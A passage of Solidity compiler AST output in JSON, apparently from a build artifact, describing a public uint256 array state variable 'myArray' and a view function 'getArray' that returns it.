									"overrides": null,
									"scope": 1879,
									"src": "9055:21:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_array$_t_uint256_$dyn_storage",
										"typeString": "uint256[]"
									},
									"typeName": {
										"baseType": {
											"id": 1867,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "9055:4:4",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										},
										"id": 1868,
										"length": null,
										"nodeType": "ArrayTypeName",
										"src": "9055:6:4",
										"typeDescriptions": {
											"typeIdentifier": "t_array$_t_uint256_$dyn_storage_ptr",
											"typeString": "uint256[]"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1877,
										"nodeType": "Block",
										"src": "10051:29:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1875,
													"name": "myArray",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1869,
													"src": "10067:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint256_$dyn_storage",
														"typeString": "uint256[] storage ref"
													}
												},
												"functionReturnParameters": 1874,
												"id": 1876,
												"nodeType": "Return",
												"src": "10060:14:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d504ea1d",
									"id": 1878,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getArray",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1870,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10012:2:4"
									},
									"returnParameters": {
										"id": 1874,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1873,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1878,
												"src": "10036:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
													"typeString": "uint256[]"
												},
												"typeName": {
													"baseType": {
														"id": 1871,
														"name": "uint",
														"nodeType": "ElementaryTypeName",
														"src": "10036:4:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1872,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "10036:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint256_$dyn_storage_ptr",
														"typeString": "uint256[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10035:15:4"
									},
									"scope": 1879,
									"src": "9995:85:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "9000:1083:4"
						}
					],
					"src": "0:11578:4"
				},
				"id": 4
			}
		}
	}
}